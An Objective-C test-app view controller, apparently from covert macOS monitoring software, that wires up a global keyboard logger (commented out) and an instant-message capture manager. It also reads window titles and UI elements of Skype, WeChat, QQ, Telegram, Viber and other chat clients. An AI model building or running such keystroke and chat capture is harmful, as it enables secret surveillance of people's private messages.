//
//  ViewController.m
//  TestApp
//
//  Created by Makara Khloth on 2/9/15.
//  Copyright (c) 2015 Makara Khloth. All rights reserved.
//

#import "ViewController.h"

#import "KeyboardEventHandler/KeyboardEventHandler.h"
#import "KeyboardLoggerManager.h"
#import "IMCaptureManagerForMac.h"

#import "IMWindowTitleUtils.h"
#import "UIElementUtilities.h"

#import "WeChat.h"

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];

    // Do any additional setup after loading the view.
//    mKeyboardEventHandler = [[KeyboardEventHandler alloc] init];
//    [mKeyboardEventHandler registerToGlobalEventHandler];
//    
//    mKeyboardLoggerManager = [[KeyboardLoggerManager alloc] initWithKeyboardEventHandler:mKeyboardEventHandler];
//    [mKeyboardLoggerManager startKeyboardLogger];
//    
//    [mKeyboardEventHandler addKeyboardEventHandlerDelegate:mKeyboardLoggerManager];
//    
//    [mKeyboardLoggerManager startKeyboardLogger];
//    
//    mIMCaptureManager = [[IMCaptureManagerForMac alloc] initWithAttachmentFolder:@"/tmp/" keyboardLoggerManager:mKeyboardLoggerManager];
}

- (void)setRepresentedObject:(id)representedObject {
    [super setRepresentedObject:representedObject];

    // Update the view, if already loaded.
}

- (IBAction)startCapture:(id)sender {
    NSLog(@"View startCapture");
    NSUInteger individualIM = 0;
    individualIM  |= 1 << 0;
    individualIM  |= 1 << 1;
    individualIM  |= 1 << 2;
    individualIM  |= 1 << 3;
    individualIM  |= 1 << 4;
    individualIM  |= 1 << 5;
    individualIM  |= 1 << 6;
    individualIM  |= 1 << 7;
    individualIM  |= 1 << 8;
    individualIM  |= 1 << 9;
    individualIM  |= 1 << 10;
    individualIM  |= 1 << 11;
    individualIM  |= 1 << 12;
    individualIM  |= 1 << 13;
    individualIM  |= 1 << 14;
    individualIM  |= 1 << 15;
    individualIM  |= 1 << 16;
    individualIM  |= 1 << 17;
    individualIM  |= 1 << 18;
    individualIM  |= 1 << 19;
    individualIM  |= 1 << 20;
    individualIM  |= 1 << 21;
    
    [mIMCaptureManager setMIndividualIM:individualIM];
    [mIMCaptureManager startCapture];
}

- (IBAction)stopCapture:(id)sender {
    [mIMCaptureManager stopCapture];
}

- (IBAction)skype:(id)sender {
    NSString *title = title = [IMWindowTitleUtils skypeWindowTitle];
    NSLog(@"----------- title = %@", title);
    /*
    NSArray *array = nil;
    [array lastObject];
    [array firstObject];
    [array objectAtIndex:0]; // Not crash
    
    array = [NSArray array];
    [array lastObject];
    [array firstObject];
    [array objectAtIndex:0]; // Crash
    */
    //[IMWindowTitleUtils logUIElementOfSkype];
}

- (IBAction)line:(id)sender {
    NSString *title = title = [IMWindowTitleUtils lineWindowTitle];
    NSLog(@"----------- title = %@", title);
    
    //[IMWindowTitleUtils logUIElementOfLINE];
}

- (IBAction)qq:(id)sender {
    NSString *title = title = [IMWindowTitleUtils qqWindowTitle];
    NSLog(@"----------- title = %@", title);
    
    //[IMWindowTitleUtils logUIElementOfQQ];
}

- (IBAction)iMessages:(id)sender {
    NSString *title = [IMWindowTitleUtils iMessagesWindowTitle];
    NSLog(@"----------- title = %@", title);
    
    //[IMWindowTitleUtils logUIElementOfiMessages];
}

- (IBAction)aim:(id)sender {
    NSString *title = [IMWindowTitleUtils aimWindowTitle];
    NSLog(@"----------- title = %@", title);
    
    [IMWindowTitleUtils logUIElementOfAIM];
}

- (IBAction)viber:(id)sender {
    NSString *title = [IMWindowTitleUtils viberWindowTitle];
    NSLog(@"----------- title = %@", title);
    title = [IMWindowTitleUtils viberWindowTitle5_0_1];
    NSLog(@"----------- title = %@", title);
    
    //[IMWindowTitleUtils logUIElementOfViber];
    //[IMWindowTitleUtils logUIElementOfViber5_0_1];
}

- (IBAction)wechat:(id)sender {
    NSString *title = [IMWindowTitleUtils wechatWindowTitle];
    NSLog(@"----------- title = %@", title);
    
    [IMWindowTitleUtils logUIElementOfWeChat];
    
    WeChatApplication *wechatApplication = [SBApplication applicationWithBundleIdentifier:@"com.tencent.xinWeChat"];
    [wechatApplication startChat:@"iphone4svvt"];
}

- (IBAction)trillian:(id)sender {
    NSString *title = [IMWindowTitleUtils trillianWindowTitle];
    NSLog(@"----------- title = %@", title);
    
    //[IMWindowTitleUtils logUIElementOfTrillian];
}

- (IBAction)telegram:(id)sender {
    
//    [IMWindowTitleUtils logPIDofWantedProcessName:@"Telegram"];
//    [IMWindowTitleUtils logPIDofWantedProcessName:@"Telegram Desktop"];
//    [IMWindowTitleUtils logBundleIDViaPID:85429];
    
    NSString *title = [IMWindowTitleUtils telegramWindowTitle];
    NSLog(@"----------- title = %@", title);
}

- (IBAction)spotlight:(id)sender {
    [IMWindowTitleUtils logUIElementOfSpotlight];
}

@end
